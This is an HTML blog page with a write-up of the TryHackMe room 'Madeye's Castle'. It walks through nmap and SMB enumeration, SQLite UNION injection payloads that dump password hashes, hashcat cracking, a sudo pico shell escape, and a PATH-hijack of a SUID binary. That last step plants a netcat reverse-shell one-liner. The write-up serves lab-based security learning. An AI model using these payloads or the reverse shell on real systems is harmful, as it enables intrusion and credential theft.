@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Madeye&#39;s Castle TryHackMe room Writeup">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Madeye&#39;s Castle TryHackMe Writeup"/>
+<meta name="twitter:description" content="Madeye&#39;s Castle TryHackMe room Writeup"/>
+
+    <meta property="og:title" content="Madeye&#39;s Castle TryHackMe Writeup" />
+<meta property="og:description" content="Madeye&#39;s Castle TryHackMe room Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/madeyescastle/" />
+<meta property="article:published_time" content="2021-02-05T16:44:52+05:30" />
+<meta property="article:modified_time" content="2021-02-05T16:44:52+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/cyborg/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/sustah/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chocolatefactory/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/overpass3/" />
+
+
+
+    <title>
+  Madeye&#39;s Castle TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/madeyescastle/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Madeye&#39;s Castle TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-02-05T16:44:52&#43;05:30'>
+                February 5, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              7-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/tryhackme/">tryhackme</a>
+      <span class="separator">•</span>
+    <a href="/tags/medium_box/">medium_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="madeyes-castlehttpstryhackmecomroommadeyescastle-tryhackme-writeup"><a href="https://tryhackme.com/room/madeyescastle">Madeye&rsquo;s Castle</a> TryHackMe Writeup</h1>
+<p><img src="/TryHackMe/MadeyeCastle/BoxImage.jpeg" alt=""></p>
+<p>This room made me learn many things through the process, including sql injection , vulnerability in rand() function and also regex !.</p>
+<p>I highly recommend doing <a href="https://tryhackme.com/room/sqlilab">SQL Injection Lab</a> before doing this as it starts from basics and explains very well . It has some very good challenges which will be useful in any rooms involving sqli.</p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>So let&rsquo;s start with nmap</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Mon Feb  1 19:16:19 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.159.205
+Increasing send delay for 10.10.159.205 from 0 to 5 due to 25 out of 62 dropped probes since last increase.
+Increasing send delay for 10.10.159.205 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
+Nmap scan report for 10.10.159.205
+Host is up, received syn-ack (0.17s latency).
+Scanned at 2021-02-01 19:16:20 IST for 2467s
+Not shown: 65531 filtered ports
+Reason: 65531 no-responses
+PORT    STATE SERVICE     REASON  VERSION
+22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
+|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
+|   256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
+80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -1m09s, deviation: 0s, median: -1m10s
+| nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   HOGWARTZ-CASTLE&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   HOGWARTZ-CASTLE&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   HOGWARTZ-CASTLE&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 45924/tcp): CLEAN (Timeout)
+|   Check 2 (port 51360/tcp): CLEAN (Timeout)
+|   Check 3 (port 13244/udp): CLEAN (Timeout)
+|   Check 4 (port 56037/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: hogwartz-castle
+|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
+|   Domain name: \x00
+|   FQDN: hogwartz-castle
+|_  System time: 2021-02-01T14:25:37+00:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-01T14:25:38
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb  1 19:57:27 2021 -- 1 IP address (1 host up) scanned in 2468.23 seconds
+</code></pre></div><p>So the ports that are open:</p>
+<ul>
+<li>22</li>
+<li>80</li>
+<li>139</li>
+<li>445</li>
+</ul>
+<p>So I visited the port 80 first.</p>
+<p><img src="/TryHackMe/MadeyeCastle/port80.png" alt=""></p>
+<p>So I didn&rsquo;t get much from gobuster , but when I saw the source code this one caught my eye.</p>
+<p><img src="/TryHackMe/MadeyeCastle/vhost.png" alt=""></p>
+<p>So I added <strong>hogwartz-castle.thm</strong> in /etc/hosts</p>
+<p>Then I visited it.</p>
+<p><img src="/TryHackMe/MadeyeCastle/login.png" alt=""></p>
+<p>Then I went to enumerate smb.</p>
+<p><img src="/TryHackMe/MadeyeCastle/shares.png" alt=""></p>
+<p>So there is an interesting share called <strong>sambashare</strong></p>
+<p>So let&rsquo;s enumerate it using</p>
+<blockquote>
+<p>smbclient -N \\hogwartz-castle.thm\sambashare</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/sambashare.png" alt=""></p>
+<p>So there are two files.</p>
+<p>The content of notes.txt :</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Hagrid told me that spells names are not good since they will not &#34;rock you&#34;
+Hermonine loves historical text editors along with reading old books.
+</code></pre></div><p>The spellnames.txt contained some names supposed to be passwords .</p>
+<p>So we got 3 names</p>
+<blockquote>
+<p>harry (from samba), hagrid , hermonine</p>
+</blockquote>
+<p>So I saved these names and used spellnames as passwords and bruteforced the web as well as ssh. Both failed . Then I used sqlmap to find if it is vulnerable to sqli.</p>
+<p>So sqlmap found a vulnerability but couldn&rsquo;t exploit.</p>
+<p><img src="/TryHackMe/MadeyeCastle/sqlmap.png" alt=""></p>
+<p>Let&rsquo;s open burpsuite .</p>
+<p>I captured the request and sent it to repeater .</p>
+<p><img src="/TryHackMe/MadeyeCastle/burp1.png" alt=""></p>
+<p>First I sent <strong>'</strong> I got internal server error which confirms it is vulnerable.</p>
+<p><img src="/TryHackMe/MadeyeCastle/burp2.png" alt=""></p>
+<p>Next I sent</p>
+<blockquote>
+<p>' union select 1&ndash; -</p>
+</blockquote>
+<p>Here I am trying to find how many coloumns are there , keep adding like 2,3,4 and so on until we get a result.
+The last dashes are to comment out the queries following it.</p>
+<p>So after some tries we get response for</p>
+<blockquote>
+<p>' union select 1,2,3,4&ndash; -</p>
+</blockquote>
+<p>So there are four coloumns .</p>
+<p><img src="/TryHackMe/MadeyeCastle/burp3.png" alt=""></p>
+<p>Next we have to find which coloumns are vulnerable.</p>
+<p>To find that do</p>
+<blockquote>
+<p>' union select 11,22,33,44&ndash; -</p>
+</blockquote>
+<p>Now we get that 1 and four are vulnerable.</p>
+<p><img src="/TryHackMe/MadeyeCastle/burp4.png" alt=""></p>
+<p>So let&rsquo;s start enumerating table names .</p>
+<p>But before that we have to know what sql is this.</p>
+<p>For sqlite use <strong>sqlite_version()</strong> if we get a reply then it is sqlite.</p>
+<p><img src="/TryHackMe/MadeyeCastle/burp5.png" alt=""></p>
+<p>Hence it is sqlite.</p>
+<p>So let&rsquo;s find table name using</p>
+<blockquote>
+<p>' union select group_concat(tbl_name),2,3,4 FROM sqlite_master&ndash; -</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/burp6.png" alt=""></p>
+<p>Hence we get the table name as users.</p>
+<p>Next aim is to find coloumn names . We can find using</p>
+<blockquote>
+<p>' union select sql,2,3,4 FROM sqlite_master  WHERE type!=&lsquo;meta&rsquo; AND sql NOT NULL AND name =&lsquo;users&rsquo;&ndash; -</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/burp7.png" alt=""></p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)
+</code></pre></div><p>So coloumns are :</p>
+<ul>
+<li>name</li>
+<li>password</li>
+<li>admin</li>
+<li>notes</li>
+</ul>
+<p>First we try to get <strong>password</strong> using</p>
+<blockquote>
+<p>&lsquo;union select group_concat(password),2,3,4 FROM users&ndash; -</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/burp8.png" alt=""></p>
+<p>So we get hashes let&rsquo;s save it to a txt file.</p>
+<p>Next <strong>notes</strong> using</p>
+<blockquote>
+<p>&lsquo;union select group_concat(notes),2,3,4 FROM users&ndash; -</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/burp9.png" alt=""></p>
+<p>Next <strong>name</strong> using</p>
+<blockquote>
+<p>&lsquo;union select group_concat(name),2,3,4 FROM users&ndash; -</p>
+</blockquote>
+<p>Let&rsquo;s save these names to a file.</p>
+<h2 id="__second-stage--initial-access-as-user__"><strong>Second Stage : Initial access as user</strong></h2>
+<p>Hence before trying to crack the hashes we have to identify them.</p>
+<p><img src="/TryHackMe/MadeyeCastle/hashid.png" alt=""></p>
+<p>So it is possibly <strong>SHA-512</strong></p>
+<p>In the <strong>notes</strong> coloumn we get a clue about password .</p>
+<p>So I thought that best64 might be the rule which I have encountered . So I combined the spellnames and best64 .</p>
+<p>Using</p>
+<blockquote>
+<p>hashcat &ndash;stdout -r /usr/share/hashcat/rules/best64.rule spellnames.txt &gt; wordlists.txt</p>
+</blockquote>
+<p>Hence I used the wordlists.txt and cracked the hashes .</p>
+<p><img src="/TryHackMe/MadeyeCastle/cracked.png" alt=""></p>
+<p>One hash cracked and I got a password and many users. I doubted the user might be Harry Turner because it was one of the names we found previously.</p>
+<p>So I tried Harry Turner in login page and got a different response.</p>
+<p><img src="/TryHackMe/MadeyeCastle/logresp.png" alt=""></p>
+<p>Hence the username is <strong>harry</strong>.</p>
+<p><img src="/TryHackMe/MadeyeCastle/harry.png" alt=""></p>
+<h2 id="__third-stage--harry-to-hermonine__"><strong>Third Stage : harry to hermonine</strong></h2>
+<p>So if we try sudo -l we get</p>
+<p><img src="/TryHackMe/MadeyeCastle/perms.png" alt=""></p>
+<p>So searching on gtfobins we get</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo -u hermonine /usr/bin/pico -s /bin/sh
+/bin/sh
+^T
+</code></pre></div><p><img src="/TryHackMe/MadeyeCastle/hermoine.png" alt=""></p>
+<h2 id="__fourth-stage--hermonine-to-root__"><strong>Fourth Stage : hermonine to root</strong></h2>
+<p>So first I ran linpeas and nothing caught my eye , then I used manual enumeration.</p>
+<p>While finding <strong>SUID</strong> binaries one binary caught my eye</p>
+<blockquote>
+<p>find / -type f -perm -u=s 2&raquo;/dev/null</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/binary.png" alt=""></p>
+<p>So I went to <strong>/srv/time-turner/</strong> directory and ran the binary.</p>
+<p><img src="/TryHackMe/MadeyeCastle/run1.png" alt=""></p>
+<p>So it is a number guessing game I suppose.</p>
+<p>So I transfered the binary to local machine and put it in ghidra.</p>
+<p><img src="/TryHackMe/MadeyeCastle/swagger.png" alt=""></p>
+<p>So it is using rand function and storing a number and asks us to guess it , if it is right it call the function called <strong>impressive()</strong> or else it prints the random number and exits.</p>
+<p><img src="/TryHackMe/MadeyeCastle/impressive.png" alt=""></p>
+<p>So impressive function calls uname without proper path , hence we can try to exploit this for rce.</p>
+<p>But first we have to guess the number correctly so that we can exploit this vuln. I searched for vulnerability in rand and from the hint I understood we can use time factor.</p>
+<p>So I tried this</p>
+<blockquote>
+<p>for i in $(seq 1 6) ; do echo 123 | ./swagger ; done</p>
+</blockquote>
+<p><img src="/TryHackMe/MadeyeCastle/run2.png" alt=""></p>
+<p>Hence this shows that the same number is being repeated , we can use this to our advantage .</p>
+<p>Hence the exploit is</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
+touch /tmp/uname
+chmod +x /tmp/uname
+<span style="color:#fff;font-weight:bold">export</span> PATH=/tmp:$PATH
+<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;your-ip&gt; 1234 &gt;/tmp/f &#34;</span> &gt; /tmp/uname
+</code></pre></div><p>Now we have to find a way to send the number which was generated back to the binary itself , so I know we have to use grep but how to filter the number only and send . Here is where regex comes into place .So I searched regex and learnt some and found one which was working.</p>
+<blockquote>
+<p>./swagger| grep -oE &lsquo;[0-9]+&rsquo; | ./swagger</p>
+</blockquote>
+<p>If we do this one liner</p>
+<p><img src="/TryHackMe/MadeyeCastle/exploit.png" alt=""></p>
+<p>And we get a shell back to our machine</p>
+<p><img src="/TryHackMe/MadeyeCastle/root.png" alt=""></p>
+<p>Hence this was a very fun room and I learnt many things thorugh the process .</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/cyborg/">Cyborg TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/sustah/">Sustah TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/chocolatefactory/">ChocolateFactory TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/battery/">Battery TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/overpass3/">Overpass3 TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
